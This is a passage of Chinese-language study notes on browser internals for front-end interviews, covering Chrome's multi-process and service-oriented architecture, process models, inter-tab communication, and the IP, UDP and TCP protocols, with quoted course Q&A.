# 浏览器工作原理

面试问：

- 前端的新技术有哪些？

- 项目开发过程中遇到的挑战有什么？

- 说一下**浏览器（以 chrome 为例）的进程架构**

- 说一下**浏览器的渲染流程**

- html5 的发展趋势

- 页面劫持，浏览器安全

- 加载速度和流畅度，页面的优化性能

**08 年 Chrome 浏览器推出，完全颠覆之前浏览器的架构设计**，在**速度和安全性**上占据了绝对优势。在 2010 年底，Google 还推出了一款网络操作系统——ChromeOS。

**浏览器的三个大发展方向**（ Web 应用能做什么，未来能适用于哪些新领域）

- **应用程序 Web 化**。（云计算和 HTML5 发展）越来越多的应用转向了浏览器 / 服务器（B/S）架构，视频、音频、游戏几大核心场景也都在往 Web 切换。

- **Web 应用移动化**。移动端 web 存在的问题：渲染流程过于复杂且性能不及原生应用、离线时用户无法使用、无法接收消息推送、移动端没有一级入口，但 Google 推出了 PWA 方案来整合 Web 和本地程序各自的优势。

- **Web 操作系统化**。Web 操作系统有两层含义：
  - 一是**利用 Web 技术构建一个纯粹的操作系统**，如 ChromeOS；
  - 二是**浏览器的底层结构往操作系统架构方向发展**：
    - Chrome 朝 SOA （面向服务的架构）的方向演化，未来**很多模块都会以服务的形式提供给上层应用使用**；
    - 在浏览器中**引入多种编程语言的支持**，比如新支持的 WebAssembly；
    - **简化渲染流程**，使渲染过程更加直接**高效**；
    - 加大对系统**设备特性的支持**；
    - 提供**对复杂 Web 项目开发的支持**。

浏览器已经逐步演化成了**操作系统之上的“操作系统”**。

## 为什么需要学习浏览器工作原理？

1. **准确评估 Web 开发项目的可行性**

   了解浏览器是如何工作的，能够决策是否可以采用 Web 来开发项目。

2. **优化 web 页面的性能**

   **站在用户体验角度来考虑页面性能**。几个常见的用户体验指标：**页面加载时长、用户交互反馈时长、Web 动画中的帧数**，这些指标是由一系列的复杂因素导致的。

   开发流畅的页面，诊断 Web 页面中的性能问题。

   **首屏的显示就涉及了 DNS、HTTP、DOM 解析、CSS 阻塞、JavaScript 阻塞等技术因素**

3. **把握技术发展的方向和本质**

   理解现有的 web 技术存在的不足，理解未来的 web 技术的针对这些不足而创造的新技术方案。

   为什么 Node.js 能如此快速地发展？根本原因还是**浏览器功能以及整个前端的开发环境，不足以支撑日益增长的需求**。

   随着**脚本执行效率的提高、页面渲染性能的提升和开发工具链的完善**，接下来的前端会进入一个相对平稳的阶段。通俗地理解就是：等到核心技术足以支撑核心需求，那么前端生态会进入一个相对稳定的状态。

**前端技术演进:**

- **首先是脚本执行速度问题**。比如针对 JavaScript **设计缺陷和执行效率**的问题，可以从以下两个途径去解决：

  不断修订和更新语言本身，出现 ES6、ES7、ES8，或者 TypeScript 。

  使用新的语言 WebAssembly 。WebAssembly 需要经过编译器编译，所以体积小、执行速度快，使用它能大幅提升语言的执行效率，但是语言本身的完善，和生态的构建都是需要花很长时间完善。

- **前端模块化开发**。Web 工程的复杂程度越来越高，这就产生了模块化开发的需求，于是相应出现了 WebComponents 标准。React 和 Vue 都在渐进地适应 WebComponents 标准，同时各种前端框架的最佳实践也会反过来影响 WebComponents 标准的制定。

  理解浏览器工作原理会对 WebComponents 中涉及的 Shadow DOM、HTML Templates 等技术有更深刻的理解。

- **渲染效率问题**。理解浏览器的渲染流程，知道目前页面的渲染依然存在的缺陷，避开这些缺陷，开发出更加高效的 Web 应用。同时，Chrome 团队也在着手改善这些缺陷，比如正在开发的下一代布局方案 LayoutNG，还有渲染瘦身方案 Slim Paint，其目的都是让渲染变得更加简单和高效。

《webkit 技术内幕》—— 朱永盛

宏观视角看浏览器：

- Chrome 进程架构
- TCP 协议
- HTTP 请求流程
- 导航流程
- 渲染流程

浏览器中 JavaScript 执行机制：

- JS 执行顺序（编译和执行）
- 调用栈
- 作用域
- 词法环境和变量环境
- this

V8 工作原理：

- 堆栈内存
- 垃圾回收
- 编译器和解释器

事件循环系统：

- 消息队列和事件循环及其代表性 API：setTimeout 和 XMLHttpRequest
- 宏任务和微任务：Promise 和 async/await

WEB 页面的性能优化：

- 利用 Chrome 做应用性能分析
- 其他性能优化
- js 脚本对 DOM 树的影响

HTTP 不同版本：

- HTTP/1
- HTTP/2
- HTTP/3

浏览器安全：

- 同源策略
- 跨站脚本攻击
- 跨站点伪造请求
- 沙盒
- https

网络，渲染进程，JavaScript 执行机制，浏览器安全。

**前端工程师需要具备哪些核心的基础技能呢？**

- 利用 UI 层来展示一些数据和承载交互
- 前端工程化（node.js）
- 渲染工具：浏览器
- 数据结构与算法
- 图形学（webgl，canvas，glsl）
- 计算机学科基础

目前 Chrome 的排版引擎是 Blink，Blink 是从 Webkit 分支独立出来 的，起初和 Webkit 基本是一样的，但是随着 Google 在 Blink 上的发力，目前的差异已经非常大了。其实站在大的结构层面来看，Blink，WebKit ， Gecko 三者的渲染流水线基本是类似的，只是一 些术语有些不同。但是落实到具体实现层面来看，差别就很大了，如 JS 引擎的实现，排版过程，绘制过程等都有很大差异。

浏览器获取服务端响应的 set-cookie 后，浏览器请求里的 cookie 是调用了浏览器本身内置的方法写进去的吗？

> 是的，你以把 http 响应头看成是服务器和浏览器对话的语言， 响应头中的 set-cookie 字段就是告诉浏览器：“浏览器，帮我把这段 Cookie 写到本地去”！ 所以浏览器在接收 set-cookie 后，就会将 cookie 写到本地！

## Chrome 架构：多进程

优化和设计 Web 应用，都可以从**网络、页面渲染，JavaScript 执行，以及 Web 安全**这些方面出发。这些功能是分散在浏览器的各个功能组件( 浏览器的多进程架构 )中的。

**Chrome 打开一个页面需要启动多少进程？**

点击 Chrome 浏览器右上角的“选项”菜单，选择“更多工具”子菜单，点击“任务管理器”，这将打开 Chrome 的任务管理器的窗口，如下图：

![img](https://static001.geekbang.org/resource/image/ce/9e/ce7f8cfe212bec0f53360422e3b03a9e.png)

Chrome 任务管理器用来展示**运行中 Chrome 使用的进程信息的，但是并不是 chrome 中所有的进程都展示。**从图中可以看到，Chrome 启动了至少 4 个进程。

现在的情况：

![image-20220430085618175](.\typora-user-images\image-20220430085618175.png)

**为什么要启动这么多进程？**

### 并行处理

**并行处理**：同一时刻处理多个任务（并行处理依赖于**多线程**来处理）。

比如计算下面这三个表达式的值，并显示出结果：

```js
A = 1 + 2;
B = 20 / 5;
C = 7 * 8;
```

可以把这个过程拆分为四个任务：

- 任务 1 是计算 A=1+2；
- 任务 2 是计算 B=20/5；
- 任务 3 是计算 C=7\*8；
- 任务 4 是显示最后计算的结果。

使用**单线程**来处理，也就是**分四步按照顺序分别执行这四个任务**。

采用**多线程**，只需分“两步走”：第一步，使用**三个线程**同时执行前三个任务；第二步，再执行第四个显示任务。

使用并行处理（多线程）能大大提升性能。

### 进程和线程

多线程可以并行处理任务，但是**线程是不能单独存在的，它是由进程来启动和管理的**。

**一个进程就是一个程序的运行实例**。详细解释就是，启动一个程序的时候，操作系统会为该程序创建一块内存，用来存放代码、运行中的数据和一个执行任务的**主线程**，我们把这样的一个**运行环境**叫进程。该主进程的线程在运行过程中，可以创建其他进程。

![img](https://static001.geekbang.org/resource/image/33/da/3380f0a16c323deda5d3a300804b95da.png)

**线程是依附于进程的，而进程中使用多线程并行处理能提升运算效率。**

#### 进程和线程的关系

1. 同一个进程中的任意一线程执行出错，都会导致**整个进程**的崩溃。

2. 同一个进程中的线程之间共享进程中的公共数据。 ![img](https://static001.geekbang.org/resource/image/d0/9e/d0efacd7f299ed99e776cb97da2a799e.png)

3. 当一个进程关闭之后，操作系统会回收进程所占用的内存。当一个进程退出时，操作系统会回收该进程所申请的所有资源；即使其中任意线程因为操作不当导致内存泄漏，当进程退出时，这些内存也会被正确回收。

4. 进程之间的内容相互隔离。进程隔离是为保护操作系统中进程互不干扰的技术，每一个进程只能访问自己占有的数据，也就避免出现进程 A 写入数据到进程 B 的情况。正是因为进程之间的数据是严格隔离的，所以**一个进程如果崩溃了，或者挂起了，是不会影响到其他进程的**。如果进程之间需要进行数据的通信，需要使用用于**进程间通信（IPC）的机制**。

### 浏览器的架构

#### 单进程浏览器时代

**单进程浏览器是指浏览器的所有功能模块都是运行在同一个进程里**，这些模块包含了**网络、插件、JavaScript 运行环境、渲染引擎和页面**等。2007 年之前，市面上浏览器都是单进程的。单进程浏览器的架构如下图所示：

![img](https://static001.geekbang.org/resource/image/6d/ca/6ddad2419b049b0eb2a8036f3dfff1ca.png)

这么多的功能模块运行在一个进程里，导致单进程浏览器**不稳定、不流畅和不安全**。

**问题 1：不稳定**

早期浏览器借助插件来实现诸如 Web 视频、Web 游戏等各种功能，但是插件是最容易出问题的模块，并且还运行在浏览器进程之中，所以一个插件的意外崩溃会引起整个浏览器的崩溃。

**渲染引擎**模块也是不稳定的，一些复杂的 JavaScript 代码就有可能引起渲染引擎模块的崩溃。渲染引擎的崩溃也会导致整个浏览器的崩溃。

**问题 2：不流畅**

**所有页面的渲染模块、JavaScript 执行环境以及插件**都是运行在同一个**线程**中的，这就意味着**同一时刻只能有一个模块可以执行**。

如果某个任务独占整个线程，这样导致其他运行在该线程中的模块就没有机会被执行。**因为浏览器中所有的页面都运行在该一个线程中，所以这些页面都没有机会去执行任务，这样就会导致整个浏览器失去响应，变卡顿。**

除了上述脚本或者插件会让单进程浏览器变卡顿外，**页面的内存泄漏**也是单进程变慢的一个重要原因。通常浏览器的内核都是非常复杂的，运行一个复杂点的页面再关闭页面，**会存在内存不能完全回收的情况**，这样导致的问题是使用时间越长，内存占用越高，浏览器会变得越慢。

**问题 3：不安全**

插件可以使用 C/C++ 等代码编写，通过插件可以获取到操作系统的任意资源，当你在页面运行一个插件时也就意味着这个插件能完全操作你的电脑。如果是个恶意插件，那么它就可以释放病毒、窃取你的账号密码，引发安全性问题。

至于页面脚本，它可以通过浏览器的漏洞来获取系统权限，这些脚本获取系统权限之后也可 以对你的电脑做一些恶意的事情，同样也会引发安全问题。

突然某个页面崩溃了或者失去响应，随之而来的是整个浏览器的崩溃或者无响应。

#### 多进程浏览器时代

2008 年 Chrome 发布时的进程架构

![img](https://static001.geekbang.org/resource/image/cd/60/cdc9215e6c6377fc965b7fac8c3ec960.png)

Chrome 的**一个个 tab 页面**是运行在**一个个单独的渲染进程**中的，同时页面里的插件也是运行在单独的插件进程之中，而进程之间是通过 IPC 机制进行通信。

由于进程是相互隔离的，所以当一个页面或者插件崩溃时，影响到的仅仅是**当前的页面进程或者插件进程**，并不会影响到浏览器和其他页面，这解决了页面或者插件的崩溃会导致**整个浏览器**崩溃，也就是不稳定的问题。

JavaScript 引擎是运行在渲染进程中的，所以即使 JavaScript 阻塞了渲染进程，影响到的也**只是当前的渲染页面**，而并不会影响浏览器和其他页面，**因为其他页面的脚本是运行在它们自己的渲染进程中的。**所以当我们再在 Chrome 中运行死循环的脚本时，没有响应的仅仅是当前的页面。

当关闭一个页面时，整个渲染进程也会被关闭，之后该进程所占用的内存都会被系统回收，这样就解决了浏览器页面的内存泄漏问题。

采用多进程架构的额外好处是可以使用安全沙箱，沙箱里面的程序可以运行，但是不能在硬盘上写入任何数据，也不能在敏感位置读取任何数据，例如你的文档和桌面。Chrome 把插件进程和渲染进程锁在沙箱里面，这样即使在渲染进程或者插件进程里面执行了恶意程序，恶意程序也无法突破沙箱去获取系统权限。

#### 最新的 Chrome 进程架构

最新的 Chrome 浏览器包括：1 个浏览器（Browser）主进程、1 个 GPU 进程、1 个网络（NetWork）进程、多个渲染进程和多个插件进程

![img](https://static001.geekbang.org/resource/image/b6/fc/b61cab529fa31301bde290813b4587fc.png)

- 浏览器进程。主要负责**界面显示**、**用户交互**、**子进程管理**，同时提供**存储**等功能。
- 渲染进程。核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，**排版引擎 Blink** 和 **JavaScript 引擎 V8** 都是运行在该进程中，**默认情况下，Chrome 会为每个 Tab 标签创建一个渲染进程。**出于安全考虑，渲染进程都是运行在沙箱模式下。渲染进程中有一个主线程，该主线程可以执行排版引擎和 JavaScript 引擎的任务，且任务是互斥的。
- GPU 进程。Chrome 刚开始发布的时候是没有 GPU 进程的。而 GPU 的使用初衷是为了实现 3D CSS 的效果，只是随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制，这使得 GPU 成为浏览器普遍的需求。Chrome 在其多进程架构上也引入了 GPU 进程。
- 网络进程。主要**负责页面的网络资源加载**，之前是作为一个模块运行在浏览器进程里面的，直至最近才独立出来，成为一个单独的进程。
- 插件进程。主要是负责插件的运行，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响。

渲染进程下的线程：

- GUI 渲染线程：解析 HTML，CSS，构建 DOM 树和 RenderObject 树，布局和绘制等，当界面需要重绘（Repaint）或由于某种操作引发回流(reflow)时，该线程就会执行。
- JS 引擎线程：JS 引擎线程负责解析 Javascript 脚本，运行代码。js 代码在执行的过程中可能会创建其他线程
- 事件触发线程：归属于浏览器而不是 JS 引擎，用来控制事件循环。当 JS 引擎执行代码块如 setTimeOut 时（也可来自浏览器内核的其他线程,如鼠标点击、AJAX 异步请求等），会将对应任务添加到事件线程中，当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待 JS 引擎的处理。
- 定时触发器线程：setInterval 与 setTimeout 所在线程，浏览器定时计数器并不是由 JavaScript 引擎 计数的,（因为 JavaScript 引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确），因此通过单独线程来计时并触发定时（计时完毕后，添加到事件队列中，等待 JS 引擎空闲后执行）
- 异步 http 请求线程
- 合成线程
- IO 线程

多进程带来的问题：

- 更高的资源占用。因为**每个进程都会包含公共基础结构的副本**（如 JavaScript 运行环境），这就意味着浏览器会消耗更多的内存资源。

- 更复杂的体系架构。**浏览器各模块之间耦合性高、扩展性差等问题**，会导致现在的架构已经很难适应新的需求了。

为了解决这些问题，2016 年，Chrome 官方团队使用“面向服务的架构”（Services Oriented Architecture，简称 SOA）的思想设计了新的 Chrome 架构。 **Chrome 整体架构会朝向现代操作系统所采用的“面向服务的架构” 方向发展，原来的各种模块会被重构成独立的服务（Service），每个服务（Service）都可以在独立的进程中运行，访问服务（Service）必须使用定义好的接口，通过 IPC 来通信，从而构建一个更内聚、松耦合、易于维护和扩展的系统，更好实现 Chrome 简单、稳定、高速、安全的目标。**

Chrome 最终要把 UI、数据库、文件、设备、网络等模块重构为基础服务，类似操作系统底层服务，Chrome“面向服务的架构”的进程模型图：

![img](https://static001.geekbang.org/resource/image/32/2a/329658fe821252db47b0964037a1de2a.png)

目前 Chrome 正处在老的架构向服务化架构过渡阶段。

同时 Chrome 还提供灵活的弹性架构，在强大性能设备上会以多进程的方式运行基础服务，但是如果在资源受限的设备上（如下图），Chrome 会将很多服务整合到一个进程中，从而节省内存占用。

![img](https://static001.geekbang.org/resource/image/a9/76/a9ba86d7b03263fa3997d3733d958176.png)

最初的浏览器都是单进程的，它们不稳定、不流畅且不安全，之后出现了 Chrome，创造性地引入了多进程架构，并解决了这些遗留问题。随后 Chrome 试图应用到更多业务场景，如移动设备、VR、视频等，为了支持这些场景，Chrome 的架构体系变得越来越复杂，这种架构的复杂性倒逼 Chrome 开发团队必须进行架构的重构，最终 Chrome 团队选择了面向服务架构（SOA）形式。。

问题：

即使是如今的多进程架构，偶尔还会碰到一些由于单个页面卡死，崩溃导致所有页面崩溃的情况，请问这是什么原因呢？

> 作者回复: 通常情况下是一个页面使用一个进程，但是，有一种情况，叫"同一站点(sa me-site)"，具体地讲，我们将“同一站点”定义为根域名（例如，geekbang.org）加上协议 （例如，https:// 或者 http://），还包含了该根域名下的所有子域名和不同的端口，比如下面这 三个：
>
> https://time.geekbang.org
>
> https://www.geekbang.org
>
> https://www.geekbang.org:8080
>
> 都是属于同一站点，因为它们的协议都是 https，而根域名也都是 geekbang.org。**你也许了解同源策略，但是同一站点和同源策略还是存在一些不同地方，在这里你需要了解它们不是同一件事。**
>
> Chrome 的默认策略是，每个标签对应一个渲染进程。但是如果从一个页面打开了新页面，而新页面和当前页面属于同一站点时，那么新页面会复用父页面的渲染进程。官方把这个默认策略叫**process-per-site-instance**。
>
> **直白的讲，就是如果几个页面符合同一站点，那么他们将被分配到一个渲染进程里面去。**
>
> 所以，这种情况下，一个页面崩溃了，会导致同一站点的页面同时崩溃，因为他们使用了同一个渲染进程。
>
> 为什么要让他们跑在一个进程里面呢？
>
> 因为在一个渲染进程里面，他们就会共享 JS 的执行环境，也就是说 A 页面可以直接在 B 页面中执行脚本。因为是同一家的站点，所以是有这个需求的。

### 浏览器的进程

#### 进程模型

- `Process-per-site-instance`：默认模式。访问不同站点创建新的进程，在旧页面中打开的新页面，且新页面与旧页面属于同一站点的话会共用一个进程
- `Process-per-site`：同一站点使用同一进程
- `Process-per-tab`：每一个标签页都创建新的进程
- `Single Process`：单进程模式

#### 线程模型

- `MessagePumpForIO`：处理进程间通信的线程，在 Chrome 中，这类线程都叫做 IO 线程

- `MessagePumpForUI`：处理 UI 的线程用的

- `MessagePumpDefault`：一般的线程用到的

#### 进程间通信方式

- `管道通信`：就是操作系统在内核中开辟一段缓冲区，进程 1 可以将需要交互的数据拷贝到这个缓冲区里，进程 2 就可以读取了
- `消息队列通信`：消息队列就是用户可以添加和读取消息的列表，消息队列里提供了一种从一个进程向另一个进程发送数据块的方法，不过和管道通信一样每个数据块有最大长度限制
- `共享内存通信`：就是映射一段能被其他进程访问的内存，由一个进程创建，但多个进程都可以访问，共享进程最快的是`IPC`方式
- `信号量通信`：比如信号量初始值是 1，进程 1 来访问一块内存的时候，就把信号量设为 0，然后进程 2 也来访问的时候看到信号量为 0，就知道有其他进程在访问了，就不访问了
- `socket`：其他的都是同一台主机之间的进程通信，而在不同主机的进程通信就要用到 socket 的通信方式了，比如发起 http 请求，服务器返回数据

### 多个标签之间的通信

没有办法直接通信，需要有一个类似中介者进行消息的转发和接收，比如

- `localStorage`：在一个标签页监听 localStorage 的变化，然后当另一个标签页修改的时候，可以通过监听获取新数据
- `WebSocket`：因为 websocket 可以实现实时服务器推送，所以服务器就可以来当这个中介者。标签页通过向服务器发送数据，然后服务器再向其他标签推送转发
- `ShareWorker`：会在页面的生命周期内创建一个唯一的线程，并开启多个页面也只会使用同一个线程，标签页共享一个线程
- `postMessage`：

```js
// 发送方
window.parent().pastMessage('发送的数据', 'http://接收的址');
// 接收方
window.addEventListener('message', (e) => {
  let data = e.data;
});
```

单进程浏览器开多个页面，渲染线程也只有一个吗？感觉一个页面开一个线程不是更合理吗？

> 之前回答的有点笼统，下面是我整理过后的回答：
>
> IE6 时代，浏览器是单进程的，所有页面也都是运行在一个主线程中的，当时 IE6 就是这样设计，而且此时的**IE6 是单标签，也就是说一个页面一个窗口**。
>
> 这时候，国内有很多国产浏览器，都是基于 IE6 来二次开发的，而 IE6 原生架构就是所有页面跑在单线程里面的，意味着，**所有的页面都共享着同一套 JavaScript 运行环境，同样，对于存储 Cookie 也都是在一个线程里面操作的**。而且这些**国产浏览器由于需要，都采用多标签的形式**，**所以其中的一个标签页面的卡顿都会影响到整个浏览器**。
>
> 基于卡顿的原因，国内浏览器就开始尝试支持页面多线程，也就是让部分页面运行在单独的线程之中，运行在单独的线程之中，意味着每个线程拥有单独的 JavaScript 执行环境，和 Cookie 环境，这时候问题就来了：比如 A 站点页面登陆一个网站，保存了一些 Cookie 数据到磁盘上，再在当前线程环境中保存部分 Session 数据，由于 Session 是不需要保存到硬盘上的，所以 Session 只会保存在当前的线程环境中。这时候再打开另外一个 A 站点的页面，假设这个页面在另外一个线程中里面，那么它首先读取硬盘上的 Cookie 信息，但是，由于 Session 信息是保存在另外一个线程里面的，无法直接读取，这样就要实现一个 Session 同步的问题，由于 IE 并没有源代码，所以实现起来非常空难，国内浏览器花了好长一点时间才解决这个问题的。
>
> Session 问题解决了，但是假死的问题依然有，因为进程内使用了一个窗口，这个窗口是依附到浏览器主窗口之上的，所以他们公用一套消息循环机制，消息循环我们后面会详细地讲，这也就意味这一个窗口如果卡死了。也会导致整个浏览器的卡死。
>
> 国产浏览器又出了一招，就是把页面做成一个单独的弹窗，如果这个页面卡死了，就把这个弹窗给隐藏掉。
>
> 这里还要提一下为什么 Chrome 中的一个页面假死不会影响到主窗口呢？这是因为 chrome 输出的实际上图片，然后浏览器端把图片贴到自己的窗口上去，在 Chrome 的渲染进程内，并没有一个渲染窗口，输出的只是图片，如果卡住了，顶多图片不更新了。
>
> 国产浏览器这一套技术花了四五年时间，等这套技术差不多成熟时，Chrome 发布了

浏览器主进程负责将渲染进程生成的图片显示在 ui 上面，就是说渲染进程输出的最终是图片，浏览器显示的是图片，那么为什么浏览器中鼠标能选中文字？如果页面是图片的话文字是选不中的啊，这里面的机制又是怎样的？

> 点击鼠标选中文字的时候，这些消息会传递到渲染进程，渲染进程再合成选中文字的状态，然后更新图片！
>
> 并不是 jpg/png 这种格式的图片；我自己理解为渲染层或者图层感觉比较好，这里作者的定义有点不够准确。

Chrome 的 navigator 属性值里只看到了 AppleWebkit，不理解这是为什么？

> 你说的是 UserAgent，又称为 UA，UA 是浏览器的身份证，通常，在发送 HTTP 请求时，UA 会附带在 HTTP 的请求头中 user-agent 字段中，这样服务器就会知道浏览器的基础信息，然后服务器会根据不同的 UA 返回不同的页面内容，比如手机上返回手机的样式，PC 就返回 PC 的样式。
>
> 你也可以在浏览器的控制台中输入： navigator.userAgent 来查看当前浏览器的 UA 信息。
>
> FireFox 中的打印的信息是： "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0"
>
> Chrome 中打印的信息是： "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Mobile Safari/537.36"
>
> 安卓系统中的 Chrome 浏览器： "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Mobile Safari/537.36"
>
> 我们知道了服务器会根据不同的 UA 来针性的设计不同页面，所以当出了一款新浏览器时，他如果使用自己独一无二的 UA，那么之前的很多服务器还需要针对他来做页面适配，这显然是不可能的，比如 Chrome 发布时他会在他的 UA 中使用“Mozilla” ，“AppleWebKit”，等关键字段，用来表示他同时支持 Mozilla 和 AppleWebKit，然后再在最后加上他自己的标示，如 Chrome/xxx。
>
> 这就解释了为什么你查看的信息中含有 WebKit 字样。

为什么单进程浏览器当时不可以采用安全沙箱？

> 如果一个进程使用了安全沙箱之后，该进程对于操作系统的权限就会受到限制，比如不能对一些位置的文件进行读写操作，而这些权限浏览器主进程所需要的，所以安全沙箱是不能应用到浏览器主进程之上的。

如果打开了 2 个页面，会有几个进程呢？是 1 个网络进程、1 个浏览器进程、1 个 GPU 进程以及 2 个渲染进程，共 5 个吗？这些进程是可以在浏览器开发者中被实际观察到的吗？

> 作者回复: 通常情况下会是五个，但是有很多其他情况：
>
> 1:如果页面里有 iframe 的话，iframe 也会运行在单独的进程中！
>
> 2:如果页面里有插件，同样插件也需要开启一个单独的进程！
>
> 3:如果你装了扩展的话，扩展也会占用进程
>
> 4:如果 2 个页面属于同一站点的话，并且从 a 页面中打开的 b 页面，那么他们会公用一个渲染进程
>
> 这些进程都可以通过 chrome 的任务管理器来查看。

为什么我这多了一个 v8 代理解析工具?

> 作者回复: Chrome 支持使用 JavaScript 来写连接代理服务器脚本，又称为在线 pac 代理脚本，pac 脚本具体什么样子你可以搜索“PAC 代理脚本”，总之使用 pac 代理脚本可以实现一些那啥的事。
>
> 刚开始的时候啊，Chrome 是在浏览器进程里面解析 pac 代理脚本的，由于是 JavaScript 脚本，所有需要在浏览器进程里面引入 V8，不过把 V8 运行在浏览器进程似乎不太好，于是 Chrome 团队后来就把这个功能独立出来一个进程了，这个进程就叫着“Utility: V8 Proxy Resolver”。 英文好的话可以看他们提供的官方文档：https://docs.google.com/document/d/1n5hr4KJhZl2A4MicTfmyiHPdiKp7kmUoWXnRBN8SrZE/edit#

对于浏览器中的页面崩溃的原因该怎么定位呢？很多情况下，问题并不能稳定复现，通过浏览器自带的开发者工具感觉很难定位到真正的问题。

> 要定位页面崩溃页面，我们先要了解下有可能造成页面崩溃的因素，根据我的实际统计数据看来，主要有以下三个方便的因素：首先，主要因素是一些第三方插件注入浏览器或者页面进程，拦截了网页的一些正常操作而导致页面或者浏览器崩溃，如一些杀毒软件，或者卫士类软件，或者一些流量劫持软件。第二个因素是插件，虽然容易崩溃，但是通常情况下只会影响到自身的进程，不过我们以前的统计数据来看，也会小概率地影响到页面的崩溃，不过整体数据来看还好了。另外一个方向来看，插件的使用率已经越来越低了，所以插件不是个大问题。第三个因素是浏览器的一些 bug，如渲染引擎，JavaScript 引擎等，不过从统计数据来看，这类因素导致的崩溃也是越来越低的了，而且随着浏览器的更新升级，引起问题的因素也是在不断变化的。
>
> 所以要直接给出页面崩溃原因是很难的，而且直接从 JS 的层面来看，也是很难跟踪崩溃原因的。提一个我之前使用的方法，那就是使用 JS 来统计页面是否崩溃，这类统计不是 100%准备，但是可以通过数据来大致判断页面是否崩溃，然后再找一些典型的用户环境来实地排查。

## TCP 协议

TCP 协议**保证资源文件被完整传输**。

衡量 Web 页面性能有一个重要的指标叫**“FP（First Paint）”**，是指**从页面加载到首次开始绘制的时长**。影响 FP 指标其中一个重要的因素是**资源在网络中的加载速度**。

优化 web 网络资源的加载速度，需要对网络协议（网络的核心）有深刻的认识，就既能清楚如何优化资源加载速度，又能发现现有项目中的问题。

**在网络中，一个文件通常会被拆分为很多数据包来进行传输，而数据包在传输过程中又有很大概率丢失或者出错。那么如何保证页面文件能被完整地送达浏览器呢？**

数据的传输过程：

- 数据包如何送达主机

- 主机如何将数据包转交给应用

- 数据是如何被完整地送达应用程序

互联网是一套理念和协议组成的体系架构。协议是一套规则和标准，如果各方都同意使用，那么它们之间的通信将变得毫无障碍。

互联网中的数据是通过数据包来传输的。如果发送的数据很大，那么该数据就会被拆分为很多小数据包来传输。

### IP

IP：把数据包送达至目的主机。

数据包要在互联网中传输，就必须知道起点和终点。而起点和终点由**网际协议**（Internet Protocol，简称 IP）标准规定。

接入互联网的计算机的地址就称为 IP 地址，访问任何网站实际上只是你的计算机向另外一台计算机请求信息。

如果要想把一个数据包从主机 A 发送给主机 B，那么在传输之前，数据包上会被附加上主机 B 的 IP 地址信息，这样在传输过程中才能正确寻址。额外地，数据包上还会附加上主机 A 本身的 IP 地址，有了这些信息主机 B 才可以回复信息给主机 A。这些附加的信息会被装进一个叫 IP 头的数据结构里。IP 头是 IP 数据包开头的信息，包含 IP 版本、源 IP 地址、目标 IP 地址、生存时间等信息。（网络层首部）

先把网络简单分为三层结构，如下图：

![img](https://static001.geekbang.org/resource/image/00/4d/00d9bcad0bda1fdb43ead428e89ae74d.png)

IP 只负责把数据包传送到对方电脑，但是对方电脑并不知道把数据包交给哪个程序。需要基于 IP 之上**开发能和应用打交道的协议**，最常见的是“用户数据包协议（User Datagram Protocol）”，简称 UDP。

### UDP

UDP：把数据包送达应用程序。

UDP 中一个最重要的信息是**端口号**，端口号就是一个数字，每个想访问网络的**程序**都需要绑定一个端口号。通过端口号。UDP 就能**把指定的数据包发送给指定的程序**，所以 IP 通过 **IP 地址信息把数据包发送给指定的电脑**，而 **UDP 通过端口号把数据包分发给正确的程序**。和 IP 头一样，端口号会被装进 UDP 头里面，UDP 头再和原始数据包合并组成新的 UDP 数据包。UDP 头中除了**目的端口**，还有**源端口号**等信息。（传输层首部）

![img](https://static001.geekbang.org/resource/image/3e/ea/3edb673a43f23d84253c52124ce447ea.png)

在使用 UDP 发送数据时，有各种因素会导致数据包出错，虽然 UDP 可以校验数据是否正确，但是**对于错误的数据包，UDP 并不提供重发机制，只是丢弃当前的包，而且 UDP 在发送之后也无法知道是否能达到目的地。**

虽说 UDP **不能保证数据可靠性，但是传输速度却非常快**，所以 UDP 会应用在一些关注速度、但不那么严格要求数据完整性的领域，如在线视频、互动游戏等。

### TCP

TCP：把数据完整的送达应用程序。

对于**要求数据传输可靠性（reliability）的应用**，如果使用 UDP 来传输会存在两个问题：

- 数据包在传输过程中容易丢失；
- 大文件会被拆分成很多小的数据包来传输，这些小的数据包会经过不同的路由，并在不同的时间到达接收端，而 UDP 协议并不知道如何组装这些数据包，从而把这些数据包还原成完整的文件。

基于这两个问题，引入 TCP 。**TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议。**相对于 UDP，TCP 有下面两个特点:

- 对于数据包丢失的情况，TCP **提供重传机制**；
- TCP 引入了**数据包排序机制**，用来保证把乱序的数据包组合成一个完整的文件。

和 UDP 头一样，TCP 头除了包含了目标端口和本机端口号外，还提供了用于排序的序列号，以便接收端通过序号来重排数据包。

TCP 下的单个数据包的传输流程：

![img](https://static001.geekbang.org/resource/image/94/32/943ac29f7d5b45a8861b0cde5da99032.png)

TCP 单个数据包的传输流程和 UDP 流程差不多，不同的地方在于，**通过 TCP 头的信息保证了一个块大的数据传输的完整性。**

**完整的 TCP 连接过程，通过这个过程你可以明白 TCP 是如何保证重传机制和数据包的排序功能的。**

从下图可以看出，一个完整的 TCP 连接的生命周期包括了“建立连接”“传输数据”和“断开连接”三个阶段。

![img](https://static001.geekbang.org/resource/image/44/44/440ee50de56edc27c6b3c992b3a25844.png)

- **建立连接阶段**。这个阶段是通过“三次握手”来建立客户端和服务器之间的连接。**TCP 提供面向连接的通信传输**。面向连接是指在数据通信开始之前先做好两端之间的准备工作。所谓三次握手，是指在建立一个 TCP 连接时，客户端和服务器总共要发送三个数据包以确认连接的建立。
